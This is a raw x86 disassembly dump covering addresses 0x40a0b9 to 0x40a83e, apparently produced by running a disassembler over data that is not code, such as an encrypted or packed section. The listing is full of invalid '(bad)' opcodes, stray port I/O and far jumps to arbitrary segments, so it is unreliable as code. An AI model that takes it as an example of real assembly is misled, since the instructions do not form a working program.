  40a0b9:	fwait
  40a0ba:	jns    0x40a0fe
  40a0bc:	jns    0x40a0d1
  40a0be:	push   edi
  40a0bf:	mov    ecx,ebp
  40a0c1:	pusha  
  40a0c2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40a0c4:	ss or  al,0x5e
  40a0c7:	inc    edi
  40a0c8:	fcmovnu st,st(4)
  40a0ca:	cs scas al,BYTE PTR es:[edi]
  40a0cc:	jnp    0x40a0e0
  40a0ce:	and    eax,0x661fda02
  40a0d3:	fbld   TBYTE PTR [edi-0x38]
  40a0d6:	(bad)  
  40a0d7:	mov    ecx,es
  40a0d9:	ret    0xb6d1
  40a0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0dd:	or     DWORD PTR [ebx+edi*2-0x6b],esp
  40a0e1:	add    DWORD PTR [esi*8+0x2b29eaf2],eax
  40a0e8:	jae    0x40a0b2
  40a0ea:	inc    ebp
  40a0eb:	pop    edx
  40a0ec:	js     0x40a115
  40a0ee:	add    ebp,0xffffffcb
  40a0f1:	les    ecx,FWORD PTR [ebp+0x11]
  40a0f4:	sbb    BYTE PTR [ebp+0xaa36f1c],ch
  40a0fa:	adc    DWORD PTR [ebx-0x4437a2c8],edx
  40a100:	push   cs
  40a101:	dec    BYTE PTR [eax+0x44]
  40a104:	mov    al,0xb8
  40a106:	ret    
  40a107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a108:	(bad)  
  40a109:	cmp    al,0x88
  40a10b:	scas   eax,DWORD PTR es:[edi]
  40a10c:	test   al,0x26
  40a10e:	jns    0x40a0c7
  40a110:	(bad)  
  40a111:	jmp    DWORD PTR [ebp+0x1b61071c]
  40a117:	add    ebp,ebp
  40a119:	xchg   esi,eax
  40a11a:	xchg   edi,eax
  40a11c:	pop    esi
  40a11d:	add    eax,DWORD PTR [ecx+ecx*4]
  40a120:	pop    edi
  40a121:	mov    bl,0xae
  40a123:	jp     0x40a13e
  40a125:	jae    0x40a0ec
  40a127:	mov    ah,0xe9
  40a129:	(bad)  
  40a12a:	lods   eax,DWORD PTR ds:[esi]
  40a12b:	push   ss
  40a12c:	fld    DWORD PTR [edx-0x5f8bb7c6]
  40a132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a133:	pop    ds
  40a134:	jle    0x40a0d2
  40a136:	jne    0x40a190
  40a138:	aaa    
  40a139:	into   
  40a13a:	(bad)  
  40a13b:	xchg   esi,eax
  40a13c:	(bad)  [esi]
  40a13e:	inc    eax
  40a13f:	mov    ds:0x676cc29e,al
  40a144:	test   eax,0x65cf2add
  40a149:	pop    ebp
  40a14a:	jmp    0xb493a021
  40a14f:	pop    ecx
  40a150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a151:	mov    ds:0xfa027bfd,al
  40a156:	inc    ebp
  40a157:	xchg   ebp,eax
  40a158:	add    al,0x89
  40a15a:	sub    dh,ah
  40a15c:	push   edx
  40a15d:	xchg   DWORD PTR [ebp-0x2],edi
  40a160:	fmul   QWORD PTR [eax]
  40a162:	push   cs
  40a163:	cmc    
  40a164:	jno    0x40a163
  40a166:	stos   BYTE PTR es:[edi],al
  40a167:	les    ecx,FWORD PTR [ebx]
  40a169:	pop    ds
  40a16a:	popf   
  40a16b:	ins    BYTE PTR es:[edi],dx
  40a16c:	jne    0x40a16d
  40a16e:	es repnz cmp edx,esi
  40a172:	jp     0x40a1e2
  40a174:	mov    dh,0x69
  40a176:	into   
  40a177:	inc    ecx
  40a178:	push   0xe723d4f9
  40a17d:	push   edi
  40a17e:	push   esi
  40a17f:	les    eax,FWORD PTR [ebx-0x53]
  40a182:	adc    al,0xa2
  40a184:	cli    
  40a185:	(bad)  
  40a186:	mov    edx,0x13fe201d
  40a18b:	cmpxchg BYTE PTR [ebp-0x40d129c6],bl
  40a192:	xlat   BYTE PTR ds:[ebx]
  40a193:	(bad)  
  40a194:	mov    esi,0x4907ef9c
  40a199:	mov    ah,0x62
  40a19b:	pop    ecx
  40a19c:	mov    dl,0x2f
  40a19e:	or     esp,edi
  40a1a0:	xchg   esp,eax
  40a1a1:	adc    al,0x20
  40a1a3:	mov    eax,0xf857789d
  40a1a8:	jp     0x40a1b0
  40a1aa:	leave  
  40a1ab:	fild   QWORD PTR [eax+0x257e774a]
  40a1b1:	fwait
  40a1b2:	xor    ebp,DWORD PTR [ebp-0x17]
  40a1b5:	jo     0x40a175
  40a1b7:	inc    eax
  40a1b8:	dec    eax
  40a1b9:	push   ebp
  40a1ba:	js     0x40a1ac
  40a1bc:	inc    esp
  40a1bd:	sbb    al,0x9d
  40a1bf:	add    DWORD PTR [eax-0x66],eax
  40a1c2:	mov    edi,0xb19ba3bf
  40a1c7:	mov    esp,0x1889afa9
  40a1cc:	mov    dh,BYTE PTR [esp+edi*1+0x38]
  40a1d0:	and    eax,0x3d9129b3
  40a1d5:	or     eax,0xbab1ce60
  40a1da:	lds    edi,FWORD PTR [edx+ecx*1-0x26]
  40a1de:	cmc    
  40a1df:	push   esi
  40a1e0:	cmp    BYTE PTR [edx+0x2b],bh
  40a1e3:	fild   WORD PTR [ebx-0x2253934f]
  40a1e9:	fidivr DWORD PTR [ebx-0x54c33f1c]
  40a1ef:	enter  0xf8d8,0xa2
  40a1f3:	int    0x8e
  40a1f5:	mov    ch,0x9c
  40a1f7:	and    al,BYTE PTR [eax-0x26]
  40a1fa:	mov    edi,0x1181177b
  40a1ff:	adc    eax,0x50cfde91
  40a204:	les    esi,FWORD PTR [edx+ebp*1-0x3b]
  40a208:	sbb    ebx,esi
  40a20a:	jmp    0x40a235
  40a20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20d:	push   0x84ab7e4d
  40a212:	xchg   edx,eax
  40a213:	cmp    al,0xe4
  40a215:	jge    0x40a261
  40a217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a218:	xchg   ebp,eax
  40a219:	ins    DWORD PTR es:[edi],dx
  40a21a:	arpl   WORD PTR [edi+0x69],di
  40a21d:	fild   QWORD PTR [ebx]
  40a21f:	add    esp,0x6165cf79
  40a225:	mov    ebp,DWORD PTR [esi-0x2cd6bec8]
  40a22b:	fcomp  st(0)
  40a22d:	mov    WORD PTR [eax-0x39ec1a22],es
  40a233:	aaa    
  40a234:	popf   
  40a235:	(bad)  
  40a236:	cmp    eax,0xb0a96c85
  40a23b:	mov    edx,0x81076c17
  40a240:	jmp    0x3856:0xf9ce4324
  40a247:	mov    ebp,0xaf72dbaf
  40a24c:	dec    edx
  40a24d:	push   ds
  40a24e:	mov    ebp,ebp
  40a250:	stos   BYTE PTR es:[edi],al
  40a251:	dec    ebx
  40a252:	sub    eax,0xd31d7910
  40a257:	dec    esi
  40a258:	bound  ecx,QWORD PTR [ebx-0x47c2d433]
  40a25e:	mov    dh,0x92
  40a260:	cmp    eax,0x30eb713e
  40a265:	sub    ch,al
  40a267:	xchg   ebp,eax
  40a268:	call   0xe192eef3
  40a26d:	sbb    edx,ecx
  40a26f:	add    eax,0x65b5d952
  40a274:	popf   
  40a275:	js     0x40a222
  40a277:	adc    BYTE PTR [ebp-0x51967f25],0x23
  40a27e:	into   
  40a27f:	sub    DWORD PTR [esi-0x1e],0xfffffffd
  40a283:	sbb    dl,BYTE PTR [ecx-0x7f]
  40a286:	add    eax,0x161b27fc
  40a28b:	xor    eax,0x9444a6fc
  40a290:	out    0x23,al
  40a292:	sub    dl,ch
  40a294:	aaa    
  40a295:	mov    ds:0xab19a6b2,al
  40a29a:	sti    
  40a29b:	cs push cs
  40a29d:	imul   ebp,DWORD PTR [edi],0x854f6c26
  40a2a3:	pop    esi
  40a2a4:	je     0x40a252
  40a2a6:	(bad)  
  40a2a7:	ror    BYTE PTR [ebx],0xc0
  40a2aa:	sub    al,0x8d
  40a2ac:	ret    
  40a2ad:	arpl   WORD PTR [esp+ebx*8-0x14dae129],dx
  40a2b4:	out    0x3,al
  40a2b6:	cmp    ah,BYTE PTR [esi+edx*8+0x67]
  40a2ba:	cmp    eax,ebp
  40a2bc:	test   BYTE PTR [edi-0x752b0258],0x70
  40a2c3:	fist   DWORD PTR ds:0x9401cf3a
  40a2c9:	or     eax,0xadad1b76
  40a2ce:	and    ebp,edx
  40a2d0:	push   0xffffffa0
  40a2d2:	inc    ecx
  40a2d3:	in     al,0xd9
  40a2d5:	aam    0xdf
  40a2d7:	pop    es
  40a2d8:	ds cdq 
  40a2da:	out    dx,eax
  40a2db:	clc    
  40a2dc:	lods   eax,DWORD PTR ds:[esi]
  40a2dd:	icebp  
  40a2de:	add    al,0x14
  40a2e0:	jp     0x40a2b4
  40a2e2:	mov    edi,0xd5539e77
  40a2e7:	loope  0x40a2a6
  40a2e9:	push   ds
  40a2ea:	mov    ch,BYTE PTR [edi-0x4d354376]
  40a2f0:	xchg   ecx,eax
  40a2f1:	psubb  mm1,QWORD PTR [eax-0xbfa4d49]
  40a2f8:	push   ebx
  40a2f9:	adc    al,ch
  40a2fb:	out    dx,eax
  40a2fc:	stos   BYTE PTR es:[edi],al
  40a2fd:	pop    esp
  40a2fe:	fnstenv [esi-0x75]
  40a301:	loop   0x40a2aa
  40a303:	pop    ds
  40a304:	xchg   esp,eax
  40a305:	cmp    ah,ah
  40a307:	dec    ebp
  40a308:	dec    ecx
  40a309:	sub    DWORD PTR [edx],eax
  40a30b:	outs   dx,BYTE PTR ds:[esi]
  40a30c:	in     al,dx
  40a30d:	cld    
  40a30e:	pop    edx
  40a30f:	mov    WORD PTR [eax],cs
  40a311:	add    eax,0xb85084c6
  40a316:	xchg   esi,eax
  40a317:	mov    eax,ds:0x2c00e518
  40a31c:	pusha  
  40a31d:	inc    esp
  40a31e:	enter  0x9026,0x89
  40a322:	and    DWORD PTR [edi],eax
  40a324:	jno    0x40a378
  40a326:	sub    BYTE PTR [edx+0x52],dh
  40a329:	lea    ecx,[eax-0x59]
  40a32c:	loopne 0x40a31e
  40a32e:	out    0xdf,eax
  40a330:	mov    ebx,DWORD PTR [ebp-0x19]
  40a333:	mov    ebp,0x69a0cd8a
  40a338:	popf   
  40a339:	xchg   ecx,eax
  40a33a:	mov    bl,0x19
  40a33c:	mov    ebx,ds
  40a33e:	push   edi
  40a33f:	pop    edi
  40a340:	and    eax,0x28b76e85
  40a345:	std    
  40a346:	cmp    DWORD PTR [ecx+0x10],ebp
  40a349:	jl     0x40a2f5
  40a34b:	sbb    al,0x51
  40a34d:	lea    ebp,[ebp-0x24ae85df]
  40a353:	inc    ecx
  40a354:	aad    0x9b
  40a356:	sub    dh,bh
  40a358:	push   esi
  40a359:	and    al,0xbf
  40a35b:	jbe    0x40a3bf
  40a35d:	adc    al,al
  40a35f:	add    cl,BYTE PTR [edi+0x15]
  40a362:	test   BYTE PTR [edx],ah
  40a364:	loope  0x40a3b3
  40a366:	repz mov eax,ds:0x1c2895e7
  40a36c:	pushw  0xffcb
  40a36f:	ficom  WORD PTR [ebx+0x49be3558]
  40a375:	sub    ecx,ebp
  40a377:	in     al,dx
  40a378:	ret    
  40a379:	push   0x78
  40a37b:	mov    al,ds:0xf9253afc
  40a380:	sub    eax,0x22c7ae5c
  40a385:	ss out dx,eax
  40a387:	enter  0x18d5,0xf8
  40a38b:	xchg   DWORD PTR [edi-0x10],esp
  40a38e:	pop    ebx
  40a38f:	xchg   ecx,eax
  40a390:	jge    0x40a3a0
  40a392:	popa   
  40a393:	loope  0x40a31b
  40a395:	in     eax,0xad
  40a397:	out    dx,eax
  40a398:	push   0xd9557215
  40a39d:	(bad)  
  40a39e:	push   esp
  40a39f:	adc    DWORD PTR [edi],0xffffff8c
  40a3a2:	sub    eax,0x579c6838
  40a3a7:	jmp    0x4d8f:0x3775b507
  40a3ae:	sub    BYTE PTR [esi-0x1f],ah
  40a3b1:	cmovg  edi,ebx
  40a3b4:	pushf  
  40a3b5:	in     eax,0x8c
  40a3b7:	pop    eax
  40a3b8:	jns    0x40a3ac
  40a3ba:	mov    WORD PTR ss:[esi],gs
  40a3bd:	aam    0x45
  40a3bf:	loop   0x40a42c
  40a3c1:	xchg   esp,edi
  40a3c3:	out    0xa0,al
  40a3c5:	aaa    
  40a3c6:	push   edi
  40a3c7:	inc    eax
  40a3c8:	sbb    dh,dh
  40a3ca:	or     al,0x92
  40a3cc:	and    BYTE PTR [edi+0x1f],ah
  40a3cf:	int3   
  40a3d0:	pop    es
  40a3d1:	pusha  
  40a3d2:	in     al,0x2e
  40a3d4:	in     eax,dx
  40a3d5:	xchg   esp,eax
  40a3d6:	aad    0x68
  40a3d8:	sub    DWORD PTR [ebp-0x15d2ba4],0x30
  40a3df:	and    eax,0x749411b9
  40a3e4:	loopne 0x40a44b
  40a3e6:	xor    bh,BYTE PTR [ebx+0x3b]
  40a3e9:	lds    edx,FWORD PTR [eax]
  40a3eb:	mov    al,0x5c
  40a3ed:	push   edx
  40a3ee:	push   ebp
  40a3ef:	mov    ds:0x320c601d,eax
  40a3f4:	jb     0x40a433
  40a3f6:	jle    0x40a3c6
  40a3f8:	popf   
  40a3f9:	out    0xd4,al
  40a3fb:	sar    edi,1
  40a3fd:	or     eax,0x2c4760fc
  40a402:	mov    ds:0x22e4c793,al
  40a407:	dec    ebp
  40a408:	(bad)  [ecx+0x77]
  40a40b:	cmp    ebx,edi
  40a40d:	mov    ebx,0x1057c819
  40a412:	call   0x200:0xb347e2f6
  40a419:	push   cs
  40a41a:	push   ss
  40a41b:	push   cs
  40a41c:	ja     0x40a3e8
  40a41e:	and    al,0xbf
  40a420:	sbb    DWORD PTR [ebp+0x20cff862],0xffffffb4
  40a427:	pop    ebx
  40a428:	fidivr DWORD PTR [edx]
  40a42a:	push   ds
  40a42b:	or     ecx,esi
  40a42d:	adc    al,0xbb
  40a42f:	into   
  40a430:	or     cl,ah
  40a432:	fild   WORD PTR [ebx]
  40a434:	outs   dx,BYTE PTR ds:[esi]
  40a435:	loopne 0x40a487
  40a437:	cmc    
  40a438:	sbb    DWORD PTR [edx+0x1a],esi
  40a43b:	imul   ah
  40a43d:	aas    
  40a43e:	inc    esi
  40a43f:	add    DWORD PTR [edi],ecx
  40a441:	jge    0x40a3cd
  40a443:	push   0x5db7cc66
  40a448:	mov    eax,0x1151fdf
  40a44d:	(bad)  
  40a44e:	push   cs
  40a44f:	xchg   ebp,eax
  40a450:	sub    ebp,DWORD PTR [esi+0x5ec607ec]
  40a456:	in     al,0x3d
  40a458:	data16 icebp 
  40a45a:	xchg   edx,eax
  40a45b:	lods   al,BYTE PTR es:[esi]
  40a45d:	xchg   ebp,eax
  40a45e:	lahf   
  40a45f:	mov    DWORD PTR [ecx-0x7e],0xf60dec06
  40a466:	cli    
  40a467:	iret   
  40a468:	ss inc esi
  40a46a:	mov    dh,0xff
  40a46c:	push   0xffffffc8
  40a46e:	inc    edi
  40a46f:	pop    esi
  40a470:	ss push eax
  40a472:	pop    ebp
  40a473:	jnp    0x40a4f0
  40a475:	xor    BYTE PTR [edx],0xfd
  40a478:	ins    BYTE PTR es:[edi],dx
  40a479:	sub    DWORD PTR [ecx],esp
  40a47b:	mov    al,0x29
  40a47d:	test   al,0xa5
  40a47f:	push   esp
  40a480:	sahf   
  40a481:	dec    esi
  40a482:	push   edi
  40a483:	pop    ebx
  40a484:	leave  
  40a485:	lea    edx,[ecx-0x49e2fc08]
  40a48b:	int    0xea
  40a48d:	cmp    eax,0x55e14e25
  40a492:	add    eax,0x233af1ac
  40a497:	std    
  40a498:	in     al,dx
  40a499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a49a:	cli    
  40a49b:	daa    
  40a49c:	fimul  WORD PTR ds:0xfee2d708
  40a4a2:	jae    0x40a443
  40a4a4:	mov    ecx,ebx
  40a4a6:	fisttp QWORD PTR [edi]
  40a4a8:	(bad)  
  40a4a9:	jmp    0x5c73004b
  40a4ae:	test   esi,esi
  40a4b0:	mov    al,0xeb
  40a4b2:	inc    ebp
  40a4b3:	add    dl,BYTE PTR [ecx-0x3]
  40a4b6:	vpsrlq xmm0,xmm1,XMMWORD PTR [esi]
  40a4ba:	sahf   
  40a4bb:	mov    esp,0x97983abe
  40a4c0:	lea    ebx,[ebx-0x1f]
  40a4c3:	das    
  40a4c4:	sub    DWORD PTR [esi-0x7b0fc480],ecx
  40a4ca:	test   al,0x5d
  40a4cc:	mov    eax,ds:0x600cf92
  40a4d1:	jg     0x40a459
  40a4d3:	into   
  40a4d4:	add    DWORD PTR [esi+0x14496dd9],0x8fe22ff0
  40a4de:	and    eax,DWORD PTR [ebx-0x72e82007]
  40a4e4:	xchg   ecx,eax
  40a4e5:	sbb    bh,BYTE PTR [ebp-0x48162a51]
  40a4eb:	ror    DWORD PTR [ecx],0x60
  40a4ee:	xor    al,0xaf
  40a4f0:	push   ecx
  40a4f1:	xchg   DWORD PTR [edi],ecx
  40a4f3:	out    0xb7,al
  40a4f5:	mov    ds:0xa795fedd,al
  40a4fa:	pushf  
  40a4fb:	lock cdq 
  40a4fd:	popf   
  40a4fe:	lock jl 0x40a537
  40a501:	js     0x40a48b
  40a503:	sub    BYTE PTR [edx-0x2d],bl
  40a506:	pushf  
  40a507:	mov    dh,0xa1
  40a509:	ret    0x68
  40a50c:	call   0x5a07:0x1911f3d4
  40a513:	lahf   
  40a514:	push   0xfffffff3
  40a516:	adc    al,0xfd
  40a518:	sub    al,0x76
  40a51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a51b:	mov    ecx,0xa00bafad
  40a520:	stc    
  40a521:	fist   DWORD PTR [ebp+0x48]
  40a524:	ret    0x3230
  40a527:	push   ebp
  40a528:	or     cl,al
  40a52a:	repnz adc dl,BYTE PTR fs:[eax+0x5a]
  40a52f:	fadd   DWORD PTR [ebx]
  40a531:	jmp    0x40a4f7
  40a533:	cmp    dh,BYTE PTR [ebx]
  40a535:	mov    ch,0xd4
  40a537:	aaa    
  40a538:	xchg   edx,eax
  40a539:	push   ds
  40a53a:	mov    eax,ds:0xebbd40f5
  40a53f:	push   ebx
  40a540:	pop    ebx
  40a541:	je     0x40a595
  40a543:	out    0xf,eax
  40a545:	or     DWORD PTR [ebx+0x3bfcbc36],ebx
  40a54b:	pop    ss
  40a54c:	scas   al,BYTE PTR es:[edi]
  40a54d:	push   0x68
  40a54f:	retf   
  40a550:	stos   DWORD PTR es:[edi],eax
  40a551:	jno    0x40a50c
  40a553:	aam    0x3e
  40a555:	in     al,0xb6
  40a557:	fldcw  WORD PTR [esi]
  40a559:	jne    0x40a554
  40a55b:	jle    0x40a5c0
  40a55d:	cld    
  40a55e:	sbb    al,0xfe
  40a560:	push   0x462cb707
  40a565:	ret    0xd656
  40a568:	mov    eax,ds:0x487b338b
  40a56d:	pop    esp
  40a56e:	lock pop esi
  40a570:	mov    al,ds:0xf4cc0efc
  40a575:	adc    DWORD PTR [edx-0x78ab8d37],ebp
  40a57b:	enter  0xcc3e,0x87
  40a57f:	push   eax
  40a580:	push   0x6dc0202c
  40a585:	adc    BYTE PTR [ecx],ch
  40a587:	fsub   DWORD PTR [esi]
  40a589:	push   0x28
  40a58b:	pop    es
  40a58c:	mov    dl,0x7f
  40a58e:	add    eax,0x986b5188
  40a593:	test   DWORD PTR [edi],ebx
  40a595:	and    al,0xc4
  40a597:	xlat   BYTE PTR ds:[ebx]
  40a598:	mov    ds,esp
  40a59a:	leave  
  40a59b:	xchg   eax,ebp
  40a59d:	sub    DWORD PTR [ebx],ebp
  40a59f:	dec    edi
  40a5a0:	sub    al,0xbc
  40a5a2:	push   es
  40a5a3:	call   0xa901:0xd05d220d
  40a5aa:	mov    ds:0xdc1f5c8a,eax
  40a5af:	or     bh,BYTE PTR [edi+0x2e]
  40a5b2:	ficomp WORD PTR [ecx-0x25825cee]
  40a5b8:	add    al,0xd3
  40a5ba:	pop    ds
  40a5bb:	mov    ebx,0x23a210e9
  40a5c0:	adc    DWORD PTR [edi],ebx
  40a5c2:	(bad)  
  40a5c3:	data16 stc 
  40a5c5:	sub    esp,DWORD PTR [edi+eiz*2]
  40a5c8:	gs cmp DWORD PTR es:[eax+0x61],ecx
  40a5cd:	xor    BYTE PTR [ebx-0x7a],bl
  40a5d0:	jmp    0x75d0:0xd12df52f
  40a5d7:	icebp  
  40a5d8:	mov    al,ds:0xdf9cf1fe
  40a5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5de:	cli    
  40a5df:	adc    ebp,eax
  40a5e1:	inc    ecx
  40a5e2:	add    al,0x93
  40a5e4:	cmc    
  40a5e5:	and    dl,BYTE PTR [edx+0x73199115]
  40a5eb:	xor    cl,BYTE PTR ds:0xcae8bfb0
  40a5f1:	shl    BYTE PTR [esi-0x66599113],1
  40a5f7:	dec    edi
  40a5f8:	sub    dl,BYTE PTR [edx+0x644ee04e]
  40a5fe:	xor    al,0x44
  40a600:	mov    ch,0x6b
  40a602:	ror    BYTE PTR [esi],0x23
  40a605:	mov    eax,ds:0x9cbdbe72
  40a60a:	and    eax,0xe3f6c310
  40a60f:	out    0xbe,al
  40a611:	ror    ch,1
  40a613:	aad    0xc
  40a615:	or     BYTE PTR [esi+0x75],al
  40a618:	(bad)  
  40a619:	cld    
  40a61a:	add    ecx,DWORD PTR [esi+0x76]
  40a61d:	and    eax,DWORD PTR [bx+di-0xd]
  40a621:	out    0xc8,al
  40a623:	in     eax,0x3
  40a625:	inc    eax
  40a626:	enter  0xe9ad,0x9c
  40a62a:	mov    al,ds:0x3c7bb00
  40a62f:	cdq    
  40a630:	add    esp,esp
  40a632:	xchg   ebx,eax
  40a633:	mov    al,0x55
  40a635:	or     DWORD PTR ds:0x98e288f0,ebx
  40a63b:	out    0xfb,al
  40a63d:	jo     0xfe021833
  40a643:	sbb    DWORD PTR [edx+0x758ca781],esp
  40a649:	push   DWORD PTR [edx+0x33a50231]
  40a64f:	or     ebp,esi
  40a651:	leave  
  40a652:	add    eax,DWORD PTR [ebp+0x13]
  40a655:	shl    ah,0xfb
  40a658:	fisttp WORD PTR [edx+0x52415e53]
  40a65e:	push   edx
  40a65f:	inc    edi
  40a660:	mov    bl,BYTE PTR [edi+ecx*8+0x37]
  40a664:	mov    ebp,0x2265b9e2
  40a669:	loope  0x40a644
  40a66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a66c:	loope  0x40a6b2
  40a66e:	jge    0x40a689
  40a670:	hlt    
  40a671:	hlt    
  40a672:	xlat   BYTE PTR ds:[ebx]
  40a673:	inc    esp
  40a674:	inc    eax
  40a675:	dec    eax
  40a676:	into   
  40a677:	in     al,dx
  40a678:	inc    ebx
  40a679:	or     al,0xee
  40a67b:	push   esi
  40a67c:	pusha  
  40a67d:	and    eax,0x784aaaf5
  40a682:	in     eax,0x42
  40a684:	mov    esp,0xd151691
  40a689:	mov    al,ds:0xc42b05b2
  40a68e:	mov    edi,DWORD PTR [ebx-0x27f4f719]
  40a694:	lock daa 
  40a696:	pop    es
  40a697:	push   eax
  40a698:	add    ecx,esp
  40a69a:	xchg   esi,eax
  40a69b:	sub    al,0xa9
  40a69d:	pop    edx
  40a69e:	sahf   
  40a69f:	pop    ss
  40a6a0:	cdq    
  40a6a1:	leave  
  40a6a2:	in     al,0xf
  40a6a4:	cmp    eax,0x79f34c66
  40a6a9:	mov    ecx,0xcbb093f4
  40a6ae:	jae    0x40a6e3
  40a6b0:	or     BYTE PTR gs:[edi+0x27],0x26
  40a6b5:	xor    esp,DWORD PTR [ebp-0x6d]
  40a6b8:	call   DWORD PTR [edx+0x7d80af32]
  40a6be:	fst    DWORD PTR [eax+0x4d]
  40a6c1:	push   esp
  40a6c2:	push   eax
  40a6c3:	sub    DWORD PTR [ebx],edx
  40a6c5:	iret   
  40a6c6:	scas   al,BYTE PTR es:[edi]
  40a6c7:	retf   
  40a6c8:	or     eax,0xd4e12c75
  40a6cd:	test   eax,0x60b65e2e
  40a6d2:	adc    BYTE PTR [ecx],ch
  40a6d4:	inc    BYTE PTR [ebx]
  40a6d6:	pop    ebp
  40a6d7:	pop    ecx
  40a6d8:	cmp    cl,cl
  40a6da:	shr    BYTE PTR gs:[ebp-0x7f],cl
  40a6de:	sti    
  40a6df:	mov    edx,0x7139fe6b
  40a6e4:	cmp    edi,DWORD PTR [ebx]
  40a6e6:	and    eax,0x1c54ef14
  40a6eb:	xor    BYTE PTR [ebp-0x7bee5431],ah
  40a6f1:	nop
  40a6f2:	jbe    0x40a6c1
  40a6f4:	xchg   ebp,eax
  40a6f5:	adc    bl,BYTE PTR [ebx]
  40a6f7:	fwait
  40a6f8:	sar    esp,0x3a
  40a6fb:	pop    eax
  40a6fc:	(bad)  [ebp-0x2875783c]
  40a702:	xchg   esi,eax
  40a703:	or     eax,0xe37dfc9c
  40a708:	das    
  40a709:	mov    ebx,0xb69cd3b3
  40a70e:	inc    esi
  40a70f:	mov    ch,0xbd
  40a711:	cs jnp 0x40a712
  40a714:	mov    esp,0x3a79b602
  40a719:	leave  
  40a71a:	or     BYTE PTR [ebp-0x4e],ah
  40a71d:	inc    esp
  40a71e:	cmp    al,0x8f
  40a720:	or     eax,0x7c995e74
  40a725:	lea    edx,[edx-0x7a]
  40a728:	push   cs
  40a729:	or     al,0x50
  40a72b:	pop    ss
  40a72c:	test   eax,0x6c272765
  40a731:	jmp    0x585ee280
  40a736:	nop
  40a737:	mov    dh,0xc0
  40a739:	js     0x40a736
  40a73b:	out    0xaf,eax
  40a73d:	mov    bl,0xd1
  40a73f:	out    0x2a,al
  40a741:	ja     0x40a6f6
  40a743:	pop    edx
  40a744:	jecxz  0x40a7a2
  40a746:	mov    al,0xa1
  40a748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a749:	mov    edx,0x64f52720
  40a74e:	(bad)  
  40a74f:	mov    edi,0x2fa1d29
  40a754:	push   esp
  40a755:	xor    ecx,DWORD PTR [esi+0x6e9c7276]
  40a75b:	push   ebx
  40a75c:	fs lahf 
  40a75e:	repnz sub ebp,DWORD PTR [ebp+ebx*8-0x66cfa720]
  40a766:	test   BYTE PTR [edi+0x3c],ah
  40a769:	jp     0x40a7ab
  40a76b:	aad    0x6d
  40a76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a76e:	and    DWORD PTR [ebp+0x1191fbf6],0xfffffffa
  40a775:	clc    
  40a776:	int    0x8
  40a778:	in     al,dx
  40a779:	or     ch,BYTE PTR [esi*1-0x7d47cf8f]
  40a780:	popa   
  40a781:	out    0x1b,eax
  40a783:	sub    edx,DWORD PTR [ebx-0x786453e]
  40a789:	or     al,0x1b
  40a78b:	inc    ebp
  40a78c:	outs   dx,DWORD PTR ds:[esi]
  40a78d:	add    al,bl
  40a78f:	out    dx,al
  40a790:	outs   dx,DWORD PTR ds:[esi]
  40a791:	clc    
  40a792:	stc    
  40a793:	lea    esi,[ebx]
  40a795:	int3   
  40a796:	hlt    
  40a797:	shl    ch,0xd3
  40a79a:	in     eax,dx
  40a79b:	in     al,dx
  40a79c:	stc    
  40a79d:	xor    BYTE PTR [edi-0x58],dh
  40a7a0:	dec    ebx
  40a7a1:	xchg   esi,eax
  40a7a2:	pop    ds
  40a7a3:	cli    
  40a7a4:	and    al,0x75
  40a7a6:	xchg   ecx,eax
  40a7a7:	mov    dl,0x84
  40a7a9:	add    bh,BYTE PTR [ebp-0x5d]
  40a7ac:	mov    ebx,DWORD PTR [ebp-0x71]
  40a7af:	int3   
  40a7b0:	int3   
  40a7b1:	daa    
  40a7b2:	inc    ecx
  40a7b3:	push   eax
  40a7b4:	xchg   edi,eax
  40a7b5:	stos   DWORD PTR es:[edi],eax
  40a7b6:	add    al,0x8e
  40a7b8:	cmc    
  40a7b9:	fidiv  WORD PTR [eax+0x2aaf0754]
  40a7bf:	jne    0x40a7ae
  40a7c1:	and    eax,0x59bfeda6
  40a7c6:	jne    0x40a819
  40a7c8:	cmc    
  40a7c9:	aas    
  40a7ca:	pushf  
  40a7cb:	inc    BYTE PTR [ecx+0x50]
  40a7ce:	hlt    
  40a7cf:	mov    esp,0x52d7ba5f
  40a7d4:	cmp    edi,DWORD PTR [esi+0x7e]
  40a7d7:	push   ebp
  40a7d8:	scas   al,BYTE PTR es:[edi]
  40a7d9:	ficomp DWORD PTR ds:0xa401862d
  40a7df:	push   ebx
  40a7e0:	add    al,0x2d
  40a7e2:	bound  eax,QWORD PTR [ebp-0x3d233184]
  40a7e8:	ja     0x40a7d7
  40a7ea:	dec    edx
  40a7eb:	rcl    DWORD PTR [edi+eiz*8],0xc3
  40a7ef:	fwait
  40a7f0:	push   edx
  40a7f1:	sti    
  40a7f2:	lahf   
  40a7f3:	dec    ecx
  40a7f4:	test   al,0x99
  40a7f6:	outs   dx,BYTE PTR ds:[esi]
  40a7f7:	out    0xc9,al
  40a7f9:	adc    ch,BYTE PTR [ecx+0x4c45cc27]
  40a7ff:	or     ah,BYTE PTR [edx-0x4]
  40a802:	mov    ?,WORD PTR [edi]
  40a804:	lods   eax,DWORD PTR ds:[esi]
  40a805:	lock test al,0xbf
  40a808:	add    eax,0x909b01a
  40a80d:	mov    edx,DWORD PTR ds:0xe740a732
  40a813:	cmp    DWORD PTR [edi+0x72],esp
  40a816:	frstor [eax-0x2b2010f3]
  40a81c:	cmp    DWORD PTR [esi-0xcc65919],esp
  40a822:	fs adc eax,0x8251529f
  40a828:	stc    
  40a829:	dec    BYTE PTR [ebx+ebx*8+0x38]
  40a82d:	and    bh,bl
  40a82f:	sub    edx,edi
  40a831:	push   ecx
  40a832:	pop    edx
  40a833:	adc    BYTE PTR [esp+ecx*2-0x2e],0x39
  40a838:	and    ebp,ebp
  40a83a:	das    
  40a83b:	mov    esi,ebp
  40a83d:	pop    ss
  40a83e:	pop    es
